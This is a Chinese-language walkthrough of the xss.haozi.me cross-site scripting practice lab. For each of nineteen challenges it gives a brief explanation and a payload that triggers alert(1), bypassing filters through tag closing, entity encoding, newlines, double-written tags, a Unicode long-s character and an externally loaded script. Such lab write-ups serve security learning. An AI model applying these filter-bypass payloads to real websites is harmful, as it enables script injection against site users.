简单的XSS弹窗练习，通过输入使弹窗显示“1”即可。  
URL:https://xss.haozi.me/  

# 0x00
思路：无任何过滤，直接通过alert弹窗，script标签闭合。  
payload:

```
<script>alert(1)</script>
```

# 0x01
思路：无任何过滤，通过textarea标签包含输入内容，所以先闭合textarea标签即可。  
payload:

```
</textarea><script>alert(1)</script>
```

# 0x02
思路：将输入内容包含到了value值中，所以先闭合value值和input标签即可。  
payload:

```
"><script>alert(1)</script>
```

# 0x03
思路：服务器端将“(”和“)”过滤，无法直接通过alert(1)实现，通过反括号“`”即可。  
payload:

```
<script>alert`1`</script>
```

# 0x04
思路：服务器端将“(”、“)”和“`”过滤，此时考虑将括号转义，通过<svg>标签执行html转义字符。  
payload:

```
<svg><script>alert&#x28;1&#x29;</script>
```

# 0x05
思路：服务器端将“-->”过滤，“<\!--”可以通过“-->”和“--!>”两种方式闭合。  
payload:

```
--!><script>alert(1)</script>
```

# 0x06
思路：服务器端将以auto、on开头，=为结尾的属性过滤，通过换行绕过过滤。  
payload:

```
type="image" src onerror
="alert(1)"
```

# 0x07
思路：服务器端将<>内的内容过滤，通过少输入一个>绕过，不影响运行。 
payload:

```
<body onload="alert(1)"
```


# 0x08
思路：服务器端将<>内的内容过滤，通过换行绕过即可。  
payload:

```
</style
><script>alert(1)</script>
```

# 0x09
思路：根据输入要求先输入https://www.segmentfault.com进行匹配，然后闭合script标签即可。  
payload:

```
https://www.segmentfault.com"></script><script>alert(1)</script>
```

# 0x0A
思路：服务器端已经对一些符号进行了过滤，根据输入要求先输入https://www.segmentfault.com进行匹配，然后通过网址运行js脚本即可。  
payload:

```
https://www.segmentfault.com.haozi.me/j.js
```

# 0x0B
思路：服务器端将输入字符串全部转成了大写，但html标签和域名不区分大小写，通过网址运行js脚本即可。
payload:

```
<script src="https://www.segmentfault.com.haozi.me/j.js"></script>
```

# 0x0C
思路：服务器端将输入字符串全部转成了大写，同时对script字符进行了一次过滤，通过双写script在过滤一遍后保留其中一个即可。  
payload:

```
<scscriptript src="https://www.segmentfault.com.haozi.me/j.js"></scrscriptipt>
```

# 0x0D
思路：输入内容包含在script标签的注释中，通过换行绕开注释，在结尾输入-->注释掉后括号。  
payload:

```

alert(1)
-->
```

# 0x0E
思路：输入字符<后的字母都会被转义，通过古英文中s的写法“ſ”可以绕过基于ascii码判断的字母转义，并通过外部url绕过字符串大写转义。  
payload:

```
<ſcript src="https://www.segmentfault.com.haozi.me/j.js"></script>
```

# 0x0F
思路：表面上对输入的&,',",<,>,\和/字符进行了html转义，但实际上在解析过程中html解析先于js解析，转义工作无意义。先闭合引号和括号，再注释掉后面的内容即可。  
payload:

```
');alert(1)//
```

# 0x10
思路：无任何过滤。  
payload:

```
alert(1)
```

# 0x11
思路：虽然"被转义为\"，但输入一个后双引号正好可以把\闭合到引号中，再闭合括号，注释掉后面内容即可。  
payload:

```
"),alert(1)//
```

# 0x12
思路：闭合script标签重新构造即可。  
payload:

```
</script>
<script>alert(1)</script>
```

# 总结
整体而言题目偏简单，难度并非逐题提高，而且源码已经放出可以直接分析，可供新手练习，熟悉JavaScript标签。未来可以尝试每道题提出更多解法。